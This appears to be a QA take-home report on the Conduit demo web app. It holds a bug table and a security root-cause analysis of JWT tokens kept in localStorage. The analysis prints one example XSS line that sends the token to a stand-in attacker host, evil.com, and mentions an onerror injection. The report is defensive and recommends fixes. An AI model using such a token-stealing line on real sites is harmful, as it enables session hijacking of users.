# Task 1 — Web App QA & Debug Report

**Tester:** Srimanth  
**Date:** May 21, 2026  
**Application:** Conduit (RealWorld Demo) — https://demo.realworld.io  
**Tech Stack:** Angular SPA frontend + Node.js/Express backend (api.realworld.io)  
**Testing Method:** Manual exploratory testing across all major user flows  

---

## 1. Bug Table

| # | Title / Summary | Steps to Reproduce | Expected vs Actual | Severity | Suspected Cause |
|---|---|---|---|---|---|
| 1 | **Sign-up accepts duplicate usernames without clear error** | 1. Register with username `testuser123` and a valid email. 2. Log out. 3. Try to register again with the exact same username but a different email. 4. Click "Sign up". | **Expected:** Inline field-level error "Username is already taken" appears immediately next to the username field. **Actual:** The form submits, the API returns a `422` with `{"errors":{"username":["has already been taken"]}}`, but the error renders as a generic red block at the top of the form with no field highlighting. Users are confused about which field caused the problem. | High | The frontend maps API error keys to a flat error-list component (`<ul class="error-messages">`) rather than rendering them inline next to the relevant input field. No field-level association between the error key and the DOM element exists. |
| 2 | **Login with wrong password shows no loading state — button stays active** | 1. Go to `/login`. 2. Enter valid email + wrong password. 3. Click "Sign in" rapidly (3–4 times in quick succession). | **Expected:** The "Sign in" button should be disabled and show a spinner during the API request, preventing duplicate submissions. **Actual:** The button remains fully clickable. Multiple identical `POST /api/users/login` requests fire simultaneously (visible in Network tab), potentially causing race conditions or inflated server load. | High | No `isSubmitting` guard is set on the button before the async API call completes. The button's `disabled` attribute is never toggled during form submission. |
| 3 | **Article editor allows empty Title & Body — publishes a blank article** | 1. Log in. 2. Navigate to `/editor`. 3. Leave "Article Title" blank, leave "Write your article" body blank. 4. Enter text only in the "About" and "Tags" fields. 5. Click "Publish Article". | **Expected:** Client-side validation should block submission and highlight the required Title and Body fields. **Actual:** The article publishes successfully. The global feed then displays an article with an empty title (renders as a clickable empty link) and no body content. Backend does not enforce required constraints on title/body either. | High | Missing `required` HTML attribute and no JavaScript validation before the form submits. The backend `/api/articles` endpoint also lacks server-side validation rejecting empty title/body strings. |
| 4 | **JWT token stored in localStorage — XSS security vulnerability** | 1. Log in. 2. Open browser DevTools → Application → Local Storage → `https://demo.realworld.io`. 3. Observe `jwtToken` key stored in plain text. 4. Run `localStorage.getItem('jwtToken')` in the console. | **Expected:** Sensitive auth tokens should be stored in `HttpOnly` cookies, inaccessible to JavaScript. **Actual:** The JWT is stored in `localStorage` and is fully readable by any JavaScript running on the page. A successful XSS attack (e.g., via unsanitized article body rendered as HTML) could exfiltrate the token and hijack the session. | Critical | Standard SPA anti-pattern: storing auth tokens in `localStorage` for simplicity. The app lacks a CSP header and does not use `HttpOnly`/`Secure` cookie flags for session management. |
| 5 | **Tag input adds tags on spacebar — no visual feedback, silent UX** | 1. Log in and navigate to `/editor`. 2. Click the "Enter tags" field. 3. Type a tag name (e.g., `javascript`) and press **Space**. | **Expected:** Either (a) spacebar should add the tag with clear visual feedback (chip appears), or (b) spacebar should be explicitly documented as unsupported and only Enter/comma triggers tag creation. **Actual:** Pressing Space adds an invisible/empty entry to the tags array (confirmed via Network payload: `"tagList":["javascript "]` with trailing space). The tag chip renders with a trailing space, which makes it a different tag than `"javascript"` when filtering — completely silent and confusing. | Medium | Tag input splits on the `Enter` key but does not trim whitespace from tag strings before adding them to the `tagList` array. No `.trim()` call exists on tag submission. |
| 6 | **"My Feed" tab shows blank state for new users with no explanation** | 1. Register a brand-new account. 2. Immediately navigate to the Home page. 3. Click the "Your Feed" tab. | **Expected:** A friendly empty state message such as "Follow some authors to see their articles here!" with a call-to-action button. **Actual:** The tab displays a completely blank white area — no text, no illustration, no guidance. New users have no idea what "Your Feed" means or how to populate it. | Medium | The component renders an empty `<div>` when the API returns an empty articles array, without any conditional "empty state" branch in the template. |
| 7 | **No account deletion option — users cannot remove their data (GDPR concern)** | 1. Log in. 2. Navigate to Settings (`/settings`). 3. Look for any account/data deletion option. | **Expected:** A "Delete Account" option in Settings, consistent with GDPR Article 17 (Right to Erasure) and general best practices for user data control. **Actual:** There is no way for a user to delete their account or personal data from within the app. | Medium | Feature was never implemented in the RealWorld spec. The backend has no `DELETE /api/user` endpoint, and the Settings page was built without considering data lifecycle. |
| 8 | **Comment section has no character limit — allows multi-thousand character comments** | 1. Log in. 2. Open any article. 3. In the comment box, paste 5000+ characters of text. 4. Click "Post Comment". | **Expected:** Either a character counter (e.g., max 1000 chars) with client-side enforcement, or a server-side rejection with a clear error. **Actual:** The comment is accepted and stored regardless of length. The comment then renders and distorts the article layout, pushing other content off-screen on narrow viewports. | Low | No `maxLength` attribute on the textarea and no server-side length validation in the comments API endpoint. |

---

## 2. Root-Cause Analysis — Issue #4: JWT Token Stored in localStorage

### What Is Happening

When a user logs in to the Conduit application, the server returns a JSON Web Token (JWT) inside the API response body. The Angular frontend stores this token in **`localStorage`** under the key `jwtToken` (e.g., `localStorage.setItem('jwtToken', user.token)`). This token is then retrieved from `localStorage` on every subsequent authenticated API call and attached as a Bearer token in the `Authorization` header.

### Why This Is a Problem

`localStorage` is a synchronous browser storage mechanism that is **fully accessible to any JavaScript running on the same origin.** This means that if an attacker manages to inject malicious JavaScript into the page — through a Cross-Site Scripting (XSS) vulnerability — they can trivially steal the JWT with a single line:

```js
fetch('https://evil.com/steal?t=' + localStorage.getItem('jwtToken'));
```

The Conduit app's article body supports Markdown and renders it to HTML. If the sanitization layer (e.g., `DOMPurify` or Angular's built-in `innerHTML` binding) has any gap — which is common in vibe-coded apps — an attacker could craft an article body containing a `<script>` tag or an event-handler injection (e.g., `<img onerror="...">`). Once that malicious article is viewed by any logged-in user, the XSS payload fires, exfiltrates the JWT, and the attacker gains full access to the victim's account.

### The Industry-Standard Fix

The correct approach is to store the JWT inside an **`HttpOnly`, `Secure`, `SameSite=Strict` cookie**, which is completely invisible to JavaScript. The server sets this cookie on login response headers:

```
Set-Cookie: token=<JWT>; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=86400
```

This means even a successful XSS attack cannot read the token via `document.cookie` or `localStorage`. The browser automatically attaches the cookie to every same-origin request, so the frontend requires no changes to how it sends authenticated requests.

**Additional hardening measures:**
1. Implement a strict **Content Security Policy (CSP)** header to block inline script execution.
2. Add a short **token expiry** (e.g., 15 minutes) with refresh-token rotation.
3. Audit all Markdown rendering paths to ensure `DOMPurify` or equivalent sanitization is applied before inserting HTML into the DOM.
4. Add an `X-Content-Type-Options: nosniff` and `X-Frame-Options: DENY` header on all API responses.

### Business Impact

In production, this vulnerability would be rated **Critical (CVSS 8.8+)**. A single malicious article — published by any registered user, and viewed by any other user — could result in a mass account takeover. For a platform designed for user-generated content (like a Medium clone), this attack surface is extremely dangerous and would fail any standard security audit or penetration test.

---

*Report prepared as part of Automation & QA Developer take-home assessment.*
